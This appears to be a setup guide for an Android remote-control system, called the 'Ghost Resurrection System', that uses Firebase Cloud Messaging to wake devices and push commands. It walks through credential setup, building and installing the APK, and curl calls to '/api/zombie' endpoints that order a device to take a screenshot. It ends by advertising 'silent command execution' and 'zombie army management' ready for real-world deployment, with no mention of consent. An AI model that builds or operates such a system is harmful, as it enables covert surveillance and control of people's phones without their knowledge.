# Firebase Setup Guide - Ghost Resurrection System

## Overview
This guide walks you through setting up Firebase Cloud Messaging (FCM) for the Ghost Resurrection System. FCM enables remote device wake-up and command execution without persistent connections.

## 🔥 Firebase Project Setup

### Step 1: Create Firebase Project
1. Go to [Firebase Console](https://console.firebase.google.com/)
2. Click "Create a project" or "Add project"
3. Enter project name: `remote-system-ghost` (or your preferred name)
4. Disable Google Analytics (not needed for this project)
5. Click "Create project"

### Step 2: Enable Firebase Cloud Messaging
1. In your Firebase project, go to **Project Settings** (gear icon)
2. Navigate to **Cloud Messaging** tab
3. Note your **Server key** and **Sender ID** (we'll need these)

### Step 3: Create Android App
1. In Firebase console, click **Add app** → **Android**
2. Enter Android package name: `com.remote.system`
3. Enter app nickname: `Remote System APK`
4. Click **Register app**
5. Download `google-services.json` file

### Step 4: Create Service Account (for Server)
1. Go to **Project Settings** → **Service accounts**
2. Click **Generate new private key**
3. Download the JSON file (this will be your `firebase-service-account.json`)

## 📱 Android App Configuration

### Replace google-services.json
Replace the placeholder file with your real Firebase configuration:

```bash
# Navigate to your APK project
cd /workspaces/Remote-System-APK/APK/app/

# Backup the placeholder
cp google-services.json google-services.json.placeholder

# Replace with your downloaded file
cp ~/Downloads/google-services.json ./google-services.json
```

### Verify Configuration
The `google-services.json` should contain:
- Your real `project_id`
- Valid `mobilesdk_app_id` 
- Real `api_key` (not a placeholder)
- Correct `package_name`: `com.remote.system`

## 🖥️ Server Configuration

### Replace Service Account
Replace the placeholder Firebase service account:

```bash
# Navigate to server directory
cd /workspaces/Remote-System-APK/SERVER/simple-server/

# Backup placeholder
cp firebase-service-account.json firebase-service-account.json.placeholder

# Replace with your downloaded service account JSON
cp ~/Downloads/your-project-firebase-adminsdk-xxxxx.json ./firebase-service-account.json
```

### Verify Service Account
The `firebase-service-account.json` should contain:
- `"type": "service_account"`
- Your real `project_id`
- Valid `private_key` (starts with `-----BEGIN PRIVATE KEY-----`)
- Real `client_email` ending with `.iam.gserviceaccount.com`

## 🚀 Testing FCM Setup

### 1. Build and Install APK
```bash
cd /workspaces/Remote-System-APK/APK/
./gradlew assembleDebug
adb install app/build/outputs/apk/debug/app-debug.apk
```

### 2. Start Server
```bash
cd /workspaces/Remote-System-APK/SERVER/simple-server/
npm install
npm start
```

### 3. Test Device Registration
1. Launch the Android app
2. Check server logs for FCM token registration
3. Look for: `✅ FCM device registered successfully`

### 4. Test Remote Wake-up
Use the Ghost Resurrection endpoints to test FCM messaging:

```bash
# Wake up a device
curl -X POST http://localhost:3000/api/zombie/wake/YOUR_DEVICE_ID

# Send command to device  
curl -X POST http://localhost:3000/api/zombie/YOUR_DEVICE_ID/command \
  -H "Content-Type: application/json" \
  -d '{"command": "screenshot"}'
```

## 🛠️ Troubleshooting

### "FCM features disabled" in server logs
- Verify `firebase-service-account.json` contains real credentials
- Check that `private_key` field doesn't contain `[PLACEHOLDER]`
- Ensure project_id matches your Firebase project

### APK build errors
- Verify `google-services.json` is valid JSON
- Check that package name in Firebase matches `com.remote.system`
- Clean and rebuild: `./gradlew clean assembleDebug`

### FCM token not registering
- Check device has internet connection
- Verify Firebase project has FCM enabled
- Check Android app logs for Firebase initialization errors

### No wake-up messages received
- Confirm device FCM token is registered on server
- Check Firebase Cloud Messaging quotas
- Verify device ID matches between registration and wake-up call

## 🔒 Security Notes

### Production Considerations
- Store Firebase service account securely (not in version control)
- Use environment variables for sensitive credentials
- Enable Firebase security rules
- Consider using Firebase App Check for additional security

### Service Account Security
```bash
# Set proper permissions (server only)
chmod 600 firebase-service-account.json

# Use environment variable in production
export FIREBASE_SERVICE_ACCOUNT_PATH="/secure/path/firebase-service-account.json"
```

## 📊 Monitoring FCM

### Firebase Console Monitoring
- Monitor message delivery in Firebase Console → Cloud Messaging
- Check delivery reports and error rates
- Monitor token refresh patterns

### Server Logs
Look for these key log messages:
- `🔥 Firebase Admin SDK initialized successfully`
- `✅ FCM device registered successfully`
- `👻 Zombie resurrected via FCM`
- `📨 FCM message sent successfully`

## 🎯 Ready for Production

Once Firebase is properly configured:

1. ✅ Real FCM tokens will be registered
2. ✅ Remote device wake-up will work
3. ✅ Silent command execution enabled
4. ✅ Master control panel fully functional
5. ✅ Zombie army management operational

The Ghost Resurrection System is now ready for real-world deployment!
